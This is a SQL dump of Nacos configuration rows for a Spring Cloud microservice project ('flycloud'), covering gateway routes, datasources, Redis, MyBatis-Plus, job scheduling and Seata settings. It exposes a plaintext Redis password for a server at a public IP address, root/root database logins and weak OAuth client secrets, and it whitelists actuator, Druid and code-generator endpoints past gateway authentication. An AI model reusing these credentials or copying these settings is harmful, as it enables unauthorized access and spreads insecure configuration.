INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (1, 'application-common.yaml', 'DEFAULT_GROUP', '
# spring 配置
spring:
  # 资源信息
  messages:
    # 国际化资源文件路径
    basename: i18n/messages
  servlet:
    multipart:
      # 单个文件大小
      max-file-size: 1000MB
      # 设置总上传的文件大小
      max-request-size: 5000MB

  # bean重名覆盖
  main:
    allow-bean-definition-overriding: true
    allow-circular-references: true

  mvc:
    format:
      date-time: yyyy-MM-dd HH:mm:ss

  # Jackson 配置项
  jackson:
    serialization:
      write-dates-as-timestamps: true # 设置 LocalDateTime 的格式，使用时间戳
      write-date-timestamps-as-nanoseconds: false # 设置不使用 nanoseconds 的格式。例如说 1611460870.401，而是直接 1611460870401
      write-durations-as-timestamps: true # 设置 Duration 的格式，使用时间戳
      fail-on-empty-beans: false # 允许序列化无属性的 Bean


  cloud:
    # sentinel 配置
    # sentinel:
    #   # sentinel 开关
    #   enabled: true
    #   # 取消控制台懒加载
    #   eager: true
    #   transport:
    #     # dashboard控制台服务名 用于服务发现
    #     # 如无此配置将默认使用下方 dashboard 配置直接注册
    #     server-name: ruoyi-sentinel-dashboard
    #     # 客户端指定注册的ip 用于多网卡ip不稳点使用
    #     # client-ip:
    #     # 控制台地址 从1.3.0开始使用 server-name 注册
    #     # dashboard: localhost:8718

  # redis 通用配置 子服务可以自行配置进行覆盖
  redis:
    host: 39.98.125.88
    port: 6379
    # 密码(如没有密码请注释掉password字段)
    password: wW257007
    database: 0
    timeout: 30s
    ssl: false


# redisson 配置
redisson:
  # redis key前缀
  keyPrefix:
  # 线程池数量
  threads: 4
  # Netty线程池数量
  nettyThreads: 8
  # 单节点配置
  singleServerConfig:
    # 客户端名称
    clientName: ${spring.application.name}
    # 最小空闲连接数
    connectionMinimumIdleSize: 8
    # 连接池大小
    connectionPoolSize: 32
    # 连接空闲超时，单位：毫秒
    idleConnectionTimeout: 10000
    # 命令等待超时，单位：毫秒
    timeout: 3000
    # 发布和订阅连接池大小
    subscriptionConnectionPoolSize: 50


# springdoc 配置
springdoc:
  api-docs:
    # 是否开启接口文档
    enabled: true
  swagger-ui:
    # 持久化认证数据
    persistAuthorization: true


# swagger 配置
swagger:
  enabled: true
  title: Fly Swagger API
  gateway: http://localhost:8080
  token-url: ${swagger.gateway}/auth/oauth/token
  scope: server
  services:
    flycloud-gateway: flycloud-gateway
    flycloud-system: flycloud-system
    flycloud-mall: flycloud-mall
    flycloud-music: flycloud-music
    flycloud-generator: flycloud-generator
    flycloud-job: flycloud-job
    flycloud-test: flycloud-test
', 'fb322d1639297e12716abd2e2ed076b3', '2023-02-13 06:48:34', '2024-11-30 03:35:52', 'nacos', '119.34.167.50', '', '', '公共配置: 如mybatis-plus, redis, es等', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (10, 'flycloud-gateway-dev.yaml', 'DEFAULT_GROUP', '

spring:

  cloud:
    # 网关配置
    gateway:
      metrics:
        enabled: true
      # 打印请求日志(自定义)
      requestLog: true
      discovery:
        locator:
          # 开启服务注册和发现
          enabled: true
          # 自动配置路由 (手动写路由的话, swagger整合不了)
      routes:

        # swagger接口地址重写 (只改变转发路由,无其他修改), 如将 https://localhost:8080/v3/api-docs/flycloud-system 这个路径重写为 https://localhost:8080/flycloud-system/v3/api-docs
        - id: openapi
          uri: lb://flycloud-gateway
          predicates:
            - Path=/v3/api-docs/**
          filters:
            - RewritePath=/v3/api-docs/(?<path>.*), /$\\{path}/v3/api-docs

        - id: flycloud-system              # 路由id，没有固定规则但要求唯一, 建议配合服务名
          # uri: http://localhost:8001     # 目标地址, 即断言匹配后跳转的路由地址 (即类似nginx的代理地址)
          uri: lb://flycloud-system
          order: 1
          predicates:                      # 断言（判断条件）
            - Path=/flycloud-system/**     # 断言, 路径相匹配的进行路由; 服务一般不用设置servlet-context-path,因为直接让客户端请求带上此断言服务名字即可 (即类似nginx的断言)
          # filters:
            # - StripPrefix=1              # 去除第一个路径 (http://localhost:8080/aaa/order/orderInfo -> http://localhost:8080/order/orderInfo)
            # - PrefixPath=/order          # 请求路径添加前缀 (http://localhost:8080/order/orderInfo -> http://localhost:8080/aaa/order/orderInfo)

            # - RewritePath=/v3/api-docs/(?<path>.*), /$\\{path}/v3/api-docs
            # 路由重写 (断言之前执行), 如将 https://localhost:8080/v3/api-docs/flycloud-system 这个路径重写为 https://localhost:8080/flycloud-system/v3/api-docs

        - id: flycloud-auth
          uri: lb://flycloud-auth
          predicates:
            - Path=/flycloud-auth/**
        
        - id: flycloud-bpm
          uri: lb://flycloud-bpm
          predicates:
            - Path=/flycloud-bpm/**

        - id: flycloud-mall
          uri: lb://flycloud-mall
          predicates:
            - Path=/flycloud-mall/**

        - id: flycloud-generator
          uri: lb://flycloud-generator
          predicates:
            - Path=/flycloud-generator/**

        - id: flycloud-test
          uri: lb://flycloud-test
          predicates:
            - Path=/flycloud-test/**



# 网关服务安全配置
gateway:
  server:
    security:

      # 网关认证开关
      enable: true

      # 白名单 (授权、swagger、监控中心等url)
      ignore-urls:
        - /oauth/** 
        - /auth/**
        - /gen/**
        - /actuator/**
        - /webjars/**
        - /druid/**
        - /assets/**
        - /v2/api-docs/**
        - /v3/api-docs/**
        - /swagger/api-docs
        - /swagger-ui.html
        - /swagger-resources/**
        - /doc.html



logging:
  level:
    org:
      springframework:
        cloud:
          gateway: TRACE', '3348d0fb9fc2c446c35f4621ce266c84', '2023-04-18 09:59:31', '2024-11-30 04:35:43', 'nacos', '113.88.70.177', '', '', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (29, 'application-datasource.yaml', 'DEFAULT_GROUP', '
# 数据源连接 配置
datasource:

  # 系统模块的-主库数据源 (根据需求配置-从库数据源)
  system-master:
    # jdbc 所有参数配置参考 https://lionli.blog.csdn.net/article/details/122018562
    # rewriteBatchedStatements=true 批处理优化 大幅提升批量插入更新删除性能
    url: jdbc:mysql://localhost:3306/fly-cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root
  # system-slave:

  # 工作流模块的-主库数据源 
  bpm-master:
    url: jdbc:mysql://localhost:3306/fly-cloud?useSSL=false&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true&nullCatalogMeansCurrent=true&rewriteBatchedStatements=true
    # url: jdbc:mysql://localhost:3306/fdance_cloud?useSSL=false&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true&nullCatalogMeansCurrent=true&rewriteBatchedStatements=true
    username: root
    password: root
  # bpm-slave:

  # 商城模块的-主库数据源
  mall-master:
    url: jdbc:mysql://localhost:3306/fly-cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root

  # 音乐模块的-主库数据源
  music-master:
    url: jdbc:mysql://localhost:3306/fly-music?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root

  # 定时任务数据库
  job:
    url: jdbc:mysql://localhost:3306/fly-job?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root

  # 自动生成数据库说明: 由于要自动生成某个数据库的表信息, 所以只需要指向你要生成的已经在使用的数据库即可
  gen:
    url: jdbc:mysql://localhost:3306/fly-cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root
    
#  其他数据库系统说明
#  system-oracle:
#    url: jdbc:oracle:thin:@//localhost:1521/XE
#    username: ROOT
#    password: password

#  system-postgres:
#    url: jdbc:postgresql://localhost:5432/postgres?useUnicode=true&characterEncoding=utf8&useSSL=false&autoReconnect=true&reWriteBatchedInserts=true
#    username: root
#    password: password


# 数据源属性 配置
spring:
  datasource:
    type: com.zaxxer.hikari.HikariDataSource
    # 动态数据源文档 https://www.kancloud.cn/tracy5546/dynamic-datasource/content
    dynamic:
      # 性能分析插件(有性能损耗 不建议生产环境使用)
      p6spy: false
      # 开启seata代理，开启后默认每个数据源都代理，如果某个不需要代理可单独关闭
      # seata: false
      # 严格模式 匹配不到数据源则报错
      strict: true
      hikari:
        # 最大连接池数量
        maxPoolSize: 20
        # 最小空闲线程数量
        minIdle: 10
        # 配置获取连接等待超时的时间
        connectionTimeout: 30000
        # 校验超时时间
        validationTimeout: 5000
        # 空闲连接存活最大时间，默认10分钟
        idleTimeout: 600000
        # 此属性控制池中连接的最长生命周期，值0表示无限生命周期，默认30分钟
        maxLifetime: 1800000
        # 连接测试query（配置检测连接是否有效）
        connectionTestQuery: SELECT 1
        # 多久检查一次连接的活性
        keepaliveTime: 30000


# seata配置
seata:
  # 关闭自动代理
  enable-auto-data-source-proxy: false


# MyBatisPlus配置  (https://baomidou.com/config/)
mybatis-plus:
  # 扫描mapper接口包有两种: (法1: 默认扫描(也就是加@Mapper注解);  法2: 手动扫描, 在相关启动配置类加上@MapperScan("要扫描包的路径"),  
  # 本项目用的是 法2 (因为基本上整个项目的包名前缀都是一样的,除非要注入第三方的bean); 如有需要支持多包可在注解配置 或 提升扫包等级 (例如 com.**.**.mapper)
  mapperPackage: com.fly.**.mapper
  # 对应的 XML 文件位置
  mapperLocations: classpath*:mapper/**/*Mapper.xml
  # 实体扫描，多个package用逗号或者分号分隔
  typeAliasesPackage: com.fly.**.domain,com.flycloud.**.api.entity
  # 启动时是否检查 MyBatis XML 文件的存在，默认不检查
  checkConfigLocation: false
  configuration:
    # 自动驼峰命名规则（camel case）映射
    mapUnderscoreToCamelCase: true
    # MyBatis 自动映射策略
    # NONE：不启用 PARTIAL：只对非嵌套 resultMap 自动映射 FULL：对所有 resultMap 自动映射
    autoMappingBehavior: PARTIAL
    # MyBatis 自动映射时未知列或未知属性处理策
    # NONE：不做处理 WARNING：打印相关警告 FAILING：抛出异常和详细信息
    autoMappingUnknownColumnBehavior: NONE
    # 更详细的日志输出 会有性能损耗 org.apache.ibatis.logging.stdout.StdOutImpl
    # 关闭日志记录 (可单纯使用 p6spy 分析) org.apache.ibatis.logging.nologging.NoLoggingImpl
    # 默认日志输出 org.apache.ibatis.logging.slf4j.Slf4jImpl
    logImpl: org.apache.ibatis.logging.nologging.NoLoggingImpl
  global-config:
    # 是否打印 Logo banner
    banner: true
    dbConfig:
      # 主键类型
      # AUTO 自增 NONE 空 INPUT 用户输入 ASSIGN_ID 雪花 ASSIGN_UUID 唯一 UUID
      idType: ASSIGN_ID
      # 逻辑已删除值
      logicDeleteValue: 1
      # 逻辑未删除值
      logicNotDeleteValue: 0
      insertStrategy: NOT_NULL
      updateStrategy: NOT_NULL
      where-strategy: NOT_NULL


# 数据加密
mybatis-encryptor:
  # 是否开启加密
  enable: false
  # 默认加密算法
  algorithm: BASE64
  # 编码方式 BASE64/HEX。默认BASE64
  encode: BASE64
  # 安全秘钥 对称算法的秘钥 如：AES，SM4
  password:
  # 公私钥 非对称算法的公私钥 如：SM2，RSA
  publicKey:
  privateKey:
  ', '12b19a9add6a21acd2a7c103f52aec4e', '2023-04-20 01:20:39', '2026-03-03 06:49:21', 'nacos', '183.9.105.135', '', '', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (33, 'flycloud-system-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}



# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fly

      # 客户端安全码
      client-secret: fly_secret

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**   
        - /feign/**



', '3735d9c134c24aa4dfee76a8ea6e73e7', '2023-04-20 01:31:21', '2024-12-01 15:24:54', 'nacos', '61.141.204.14', '', '', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (37, 'flycloud-job-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    type: ${spring.datasource.type}
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: ${datasource.job.url}
    username: ${datasource.job.username}
    password: ${datasource.job.password}

#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}


xxl:
  job:
    # 执行器开关
    enabled: true
    # 调度中心地址：如调度中心集群部署存在多个地址则用逗号分隔。
    # admin-addresses: http://localhost:9900
    # 调度中心应用名 通过服务名连接调度中心(启用admin-appname会导致admin-addresses不生效)
    admin-appname: fly-xxl-job-admin
    # 执行器通讯TOKEN：非空时启用
    access-token: xxl-job
    # 执行器配置
    executor:
      # 执行器AppName：执行器心跳注册分组依据；为空则关闭自动注册
      appname: ${spring.application.name}-executor
      # 执行器端口号 执行器从19901开始往后写
      port: 9901
      # 执行器注册：默认IP:PORT
      address:
      # 执行器IP：默认自动获取IP
      ip:
      # 执行器运行日志文件存储磁盘路径
      logpath: ./logs/${spring.application.name}/xxl-job
      # 执行器日志文件保存天数：大于3生效
      logretentiondays: 30', '855f2453b75b7bc1f28568d1f965ff5a', '2023-04-20 02:07:37', '2023-04-20 02:07:37', null, '116.21.159.246', '', '', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (38, 'flycloud-mall-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.mall-master.url}
          username: ${datasource.mall-master.username}
          password: ${datasource.mall-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.mall-oracle.url}
#          username: ${datasource.mall-oracle.username}
#          password: ${datasource.mall-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.mall-postgres.url}
#          username: ${datasource.mall-postgres.username}
#          password: ${datasource.mall-postgres.password}
', 'a8815931a4ab595219486f36619f3156', '2023-04-20 02:09:23', '2023-04-20 02:09:23', null, '116.21.159.246', '', '', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (40, 'flycloud-music-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.music-master.url}
          username: ${datasource.music-master.username}
          password: ${datasource.music-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.music-oracle.url}
#          username: ${datasource.music-oracle.username}
#          password: ${datasource.music-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.music-postgres.url}
#          username: ${datasource.music-postgres.username}
#          password: ${datasource.music-postgres.password}
', 'f03cd2776ac489e9528efeb47540fc06', '2023-04-20 02:10:56', '2023-04-20 02:10:56', null, '116.21.159.246', '', '', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (64, 'flycloud-generator-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}

# 代码生成 配置
gen:
  # 作者
  author: fly
  # 默认生成包路径 system 需改成自己的模块名称 如 system monitor tool
  packageName: com.fly.system
  # 自动去除表前缀，默认是false
  autoRemovePre: true
  # 表前缀（生成类名不会包含表前缀，多个用逗号分隔）
  tablePrefix: t_oa_,t_srm_


# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fly

      # 客户端安全码
      client-secret: fly_secret

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        - /gen/**', '9542a985d5dc50640e0dd5f0ce1cc904', '2023-04-21 13:35:22', '2024-12-18 14:32:22', 'nacos', '119.34.167.50', '', '', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (67, 'flycloud-test-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}
', '8e2306d55b225ae3992b1afad4042639', '2023-04-23 03:37:32', '2023-04-23 03:37:32', null, '116.21.159.246', '', '', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (80, 'flycloud-auth-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}

# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: flycloud-system

      # 客户端安全码
      client-secret: root

      # 授权类型
      # grant-types: 3
      grant-types: password

      # token有效期
      token-validity-time: 7200

      # refresh-token有效期
      refresh-token-validity-time: 7200

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**  
        - /oauth/**
        - /auth/**
', '813ebd7bf6dbe22824abf4c7a6b98b57', '2024-06-12 14:45:19', '2024-08-30 14:52:07', 'nacos', '119.34.164.140', '', '', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (81, 'gitegg-service-system-sentinel', 'DEFAULT_GROUP', '[
    {
        "resource": "/system/sentinel/protected",
        "count": 16,
        "grade": 1,
        "limitApp": "default",
        "strategy": 0,
        "controlBehavior": 0,
        "clusterMode": false
    }
]', '0274b15b6b8383e19a7d52d37f84e3e0', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (82, 'transport.type', 'SEATA_GROUP', 'TCP', 'b136ef5f6a01d816991fe3cf7a6ac763', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (83, 'transport.server', 'SEATA_GROUP', 'NIO', 'b6d9dfc0fb54277321cebc0fff55df2f', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (84, 'transport.heartbeat', 'SEATA_GROUP', 'true', 'b326b5062b2f0e69046810717534cb09', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (85, 'transport.enableClientBatchSendRequest', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (86, 'transport.threadFactory.bossThreadPrefix', 'SEATA_GROUP', 'NettyBoss', '0f8db59a3b7f2823f38a70c308361836', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (87, 'transport.threadFactory.workerThreadPrefix', 'SEATA_GROUP', 'NettyServerNIOWorker', 'a78ec7ef5d1631754c4e72ae8a3e9205', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (88, 'transport.threadFactory.serverExecutorThreadPrefix', 'SEATA_GROUP', 'NettyServerBizHandler', '11a36309f3d9df84fa8b59cf071fa2da', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (89, 'transport.threadFactory.shareBossWorker', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (90, 'transport.threadFactory.clientSelectorThreadPrefix', 'SEATA_GROUP', 'NettyClientSelector', 'cd7ec5a06541e75f5a7913752322c3af', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (91, 'transport.threadFactory.clientSelectorThreadSize', 'SEATA_GROUP', '1', 'c4ca4238a0b923820dcc509a6f75849b', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (92, 'transport.threadFactory.clientWorkerThreadPrefix', 'SEATA_GROUP', 'NettyClientWorkerThread', '61cf4e69a56354cf72f46dc86414a57e', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (93, 'transport.threadFactory.bossThreadSize', 'SEATA_GROUP', '1', 'c4ca4238a0b923820dcc509a6f75849b', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (94, 'transport.threadFactory.workerThreadSize', 'SEATA_GROUP', 'default', 'c21f969b5f03d33d43e04f8f136e7682', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (95, 'transport.shutdown.wait', 'SEATA_GROUP', '3', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (96, 'service.vgroupMapping.my_test_tx_group', 'SEATA_GROUP', 'default', 'c21f969b5f03d33d43e04f8f136e7682', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (97, 'service.default.grouplist', 'SEATA_GROUP', '172.16.20.188:8091', '7f383c6c77c5dc68eb3a94783fc1fc4a', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (98, 'service.enableDegrade', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
